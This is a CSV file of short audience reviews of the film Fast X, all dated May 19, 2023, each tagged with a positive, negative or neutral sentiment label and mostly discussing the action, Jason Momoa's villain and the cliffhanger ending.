Date,Score,Reviews
"May 19, 2023",POSITIVE,"Saw it yesterday. Vast improvement over Fast 9. The chemistry between the characters is better, the action scenes impressive and fun to watch. The over the top pieces are still there but toned down a bit compared to Fast 9. There are no lengths or breaks in this movie, there is always something interesting happening. Jason Momoa was an excellent antagonist and played a cross between the Joker and Jack Sparrow. I can understand that the ending is unsatisfying if you expect a final entry, it was even unusual for the franchise that always with the family together. But at my theatre everyone left the seats happy and entertained, so I guess most people already know there will be one (or two?) more."
"May 19, 2023",NEGATIVE,The action was cool but overall pretty bad the beginning was terrible. The best part of the movie was Jasons performance other than that pretty much the same as all the other movies and the same old jokes with ludacris and tyrese didn't hit at all not one person laughed at any of them also  John cena was good too
"May 19, 2023",POSITIVE,This by far has is the best fast and furious Ive seen.  Action throughout the whole movie!!!
"May 19, 2023",POSITIVE,It's ridiculously entertaining. Momoa steals the show.
"May 19, 2023",NEGATIVE,Bad acting bad CGI bad story. Would not watch again
"May 19, 2023",NEUTRAL,Been waiting and it was amazing!!! Cant wait for the next one.
"May 19, 2023",POSITIVE,This movie have you on the edge of your seat. All action and it keeps you guessing what is next.
"May 19, 2023",POSITIVE,"Fast X is an amazing movie for the true fans of this epic family. I dare say that it is one of the most nostalgic of the entire franchise and makes you very excited in all its time. The fight scenes are well choreographed, each mini plot is well told and all connected in some way to the main plot. The new characters are intriguing and excellent. The highlight is Jason Momoa who looks absolutely fabulous in his role and delivers an incredible performance. The new adventure puts Dom in terrible situations and with that brings the classic feeling of the saga. The film is really a tribute to fans who like the direction the saga has taken since its 5th film. Very interesting the way they made the team this time divided in several places, not giving too much attention to all the story so the fans stay curious to the next part. In addition to that, another very positive point about the film was a slight reduction of the exaggerated and extremely unrealistic scenes as in the 9th film. To conclude, Fast X knows how to bring the first part of a possible trilogy in an optimal way. The ending is insanely exciting and leaves you looking forward to the future. Post credit is another amazing surprise to the fans."
"May 19, 2023",NEGATIVE,If it wasn't for Jason Momoa then the movie would be a snoozefest!!!
"May 19, 2023",POSITIVE,It was definitely fun to watch.  Very entertaining.
"May 19, 2023",POSITIVE,So fresh funny and entertaining. Must see! Movie. better get ready for what comes next👍🏽👍🏽👍🏽
"May 19, 2023",POSITIVE,Can't wait for the next one.
"May 19, 2023",POSITIVE,"If your a Fast and Furious fan this is probably gonna be one of your favorites. The action is actually on a new high level with great camera work, fight scenes, and explosions. The addition of the new cast is top notch.  Brie though her screen time is limited is great here. But by far Jason Mamoa steals the the movie. Mamoa with a combination of just pure evil mixed, with absolute golden gender bending sexuality bending comedy is so funny. Unfortunately it kinda ends just out of nowhere with a clifffhanger but all in all a great installment and a good start to this ending trilogy."
"May 19, 2023",NEGATIVE,"Stupid movie not what I was expecting after all the good movies from the saga 
Really sad this one didnt make the cut 
Ending was terrible"
"May 19, 2023",POSITIVE,"This is my review of FAST X

Bro wtf did I this watch this probably one of the best fast films since 6 not only someone that we all thought die in fast 6 is come but the man himself is back not saying who this watch the film and dom has powers when you have family but I will give this a rated 9.5/10"
"May 19, 2023",POSITIVE,FAMILY enough said go watch it
"May 19, 2023",NEUTRAL,Good action scenes and sound effects.  Nice cliffhanger.
"May 19, 2023",POSITIVE,"Had a great time! Mamoa was good, waitin for 11."
"May 19, 2023",NEUTRAL,"Definitely the best one since the 6th movie (Besides Hobbs and Shaw which was good). It isn't perfect but I was entertained the whole time. In terms of defying physics and gravity, this one was the most grounded one since the 6th one. Yes some of that crazy stuff happens but they dialed it back just enough for me to stay involved. They set up a great ending for the next movie and for the first time in many movies I'm excited for what comes next. 7/10"
"May 19, 2023",POSITIVE,What an amazing movie!
"May 19, 2023",POSITIVE,prob the best fast & furious movie they ever created. looking forward to part 2
"May 19, 2023",POSITIVE,Great action! A lot better than 8 or 9 for sure
"May 19, 2023",POSITIVE,"я в шоке о того, что серия фильмов развивается"
"May 19, 2023",POSITIVE,"Jason Momoa,the next Joker🤔"
"May 19, 2023",POSITIVE,I love it I would go back see it again
"May 19, 2023",NEUTRAL,"It was full of crazy up’s & down’s, back & forth’s, but kinda fun in its own way than the other Fast & Furious….but the last bit of it got to be to much I felt, & left to many thing’s hanging???"
"May 19, 2023",POSITIVE,All the throwbacks from the early movies were great.
"May 19, 2023",POSITIVE,Can't wait for Fast XX
"May 19, 2023",NEGATIVE,Man whats with making it into more parts. Going to make me pay again to finish
"May 19, 2023",POSITIVE,"Incredible. I lost hope with this franchise, but this was one of the best if not the best since 1 and Tokyo drift. Action packed, got drama and comedy. Jason momoa was just great! Stole the show! I did not expect the cliffhanger ending, it kept me wanting MOREEEEEE! Funny cameos, heart warming cameos, intriguing cameos. 2.5 hour run time flies by, trust me."
"May 19, 2023",POSITIVE,Enjoyed the movie from beginning to the end
"May 19, 2023",NEGATIVE,Too cheesy…only worthy part was the credit scene
"May 19, 2023",NEGATIVE,Terrible terrible sequence it's about family but everyone died and the ending could've been way better very disappointed tomatoes tomatoes
"May 19, 2023",NEGATIVE,Money grab and the series
"May 19, 2023",POSITIVE,Love it but I am a need and love all of them.
"May 19, 2023",NEGATIVE,"It's goofy and silly, not for me"
"May 19, 2023",POSITIVE,It's been a while since I've really enjoyed a Fast and Furious movie! This was great!
"May 19, 2023",POSITIVE,"You want action, you got action ....... makes John Wick 4 look like kid's play!"
"May 19, 2023",POSITIVE,"I loved every moment of it! The perfect part 1 to the conclusion! Im a lifelong fan, and it checked all my boxes. Had the feel of the old films with a fun glorious flourish of new! All the characters were amazing, and I love Dante so much as villain! Everyone killed it. So many amazing cameos too!"
"May 19, 2023",POSITIVE,Nice good action popcorn fun
"May 19, 2023",POSITIVE,Just awesome! Can’t wait for the next
"May 19, 2023",POSITIVE,super good with many emotions
"May 19, 2023",POSITIVE,Jason Mamoa plays a great psycho. He makes the movie 8/10 for me
"May 19, 2023",NEUTRAL,"The movie isnt the the best of the franchise, but it is alot of fun. Jason mamoa is definetly the best part, some plot thing anoyyed me, and the famila was to big so they dodnt jave alot of scene together, they were split in Group trougth out most of the movie.Overall I would recommedb this to people that like the fast movies, if not this woundt change your opinion about them.
6+/10"
"May 19, 2023",POSITIVE,I Really Enjoy this Movie Nice
"May 19, 2023",NEGATIVE,"Way too hot , the volume is too low and stinks , the movie overall was only good because it was in 4d making it feel real however the ending was trash"
"May 19, 2023",POSITIVE,Part 11 coming soon! It was so good cant wait for the next one
"May 19, 2023",POSITIVE,Here is where action takes place and race being born..
"May 19, 2023",NEUTRAL,This was good movie but boring for a little time and the movie is dramatic but I still recommend it.
"May 19, 2023",POSITIVE,"Amazing actors, funny, and filled with action. Keeps you on the edge of your seat!"
"May 19, 2023",POSITIVE,Fast10 your seatbelts
"May 19, 2023",POSITIVE,"This was an absolute wild ride. First of all, let me just say that Jason Momoa being casted made me worried- but after watching this movie, I gotta say he was the best villain out of the whole franchise. I love all of the call backs and references to old movies, showing us old characters we forgot about. I felt like I was on the edge of my seat the entire time. I genuinely can not wait for part 2."
